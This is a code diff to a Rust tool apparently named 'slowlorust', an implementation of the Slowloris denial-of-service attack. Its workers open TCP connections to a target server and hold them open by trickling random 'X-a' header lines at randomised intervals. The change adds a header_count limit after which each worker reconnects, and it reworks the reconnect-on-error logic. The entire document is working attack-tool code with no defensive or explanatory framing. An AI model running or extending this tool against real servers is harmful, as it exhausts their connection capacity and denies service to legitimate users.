@@ -21,6 +21,7 @@ const USER_AGENTS: [&str; 10] = [
 pub struct Worker {
     id: u16,
     conn: String,
+    header_count: u8,
     sleep_bounds: (u8, u8),
     verbose: i32,
     rng: SmallRng,
@@ -28,7 +29,7 @@ pub struct Worker {
 }
 
 impl Worker {
-    pub fn new(id: u16, conn: String, sleep_bounds: (u8, u8), verbose: i32) -> Result<Worker, Error> {
+    pub fn new(id: u16, conn: String, header_count: u8, sleep_bounds: (u8, u8), verbose: i32) -> Result<Worker, Error> {
         let mut stream = TcpStream::connect(&conn)?;
         let mut rng = SmallRng::from_entropy();
         stream.write_all(
@@ -43,6 +44,7 @@ impl Worker {
         Ok(Worker {
             id,
             sleep_bounds,
+            header_count,
             conn,
             verbose,
             rng,
@@ -51,25 +53,28 @@ impl Worker {
     }
 
     pub fn start(&mut self) {
+        let mut sent = 0;
         loop {
             thread::sleep(Duration::from_secs(
                 self.rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64
             ));
-            match &self.stream.write_all(format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes()) {
-                Ok(_) if (self.verbose > 0) => {
-                    info!("[slowlorust_{:03}] Data send success.", self.id)
-                }
-                Ok(_) => {}
-                Err(_) => {
-                    if let Ok(worker) = Worker::new(self.id, self.conn.clone(), self.sleep_bounds, self.verbose) {
-                        if self.verbose > 0 {
-                            warn!("[slowlorust_{:03}] Recreating.", self.id);
-                        }
-                        *self = worker;
-                        // Avoid nested loops
-                        break;
+            if sent >= self.header_count
+                || self
+                    .stream
+                    .write_all(format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes())
+                    .is_err()
+            {
+                if let Ok(worker) = Worker::new(self.id, self.conn.clone(), self.header_count, self.sleep_bounds, self.verbose) {
+                    if self.verbose > 0 {
+                        warn!("[slowlorust_{:03}] Recreating.", self.id);
                     }
+                    *self = worker;
+                    // Avoid nested loops
+                    break;
                 }
+            } else {
+                info!("[slowlorust_{:03}] Data send success.", self.id);
+                sent += 1;
             }
         }
         self.start();
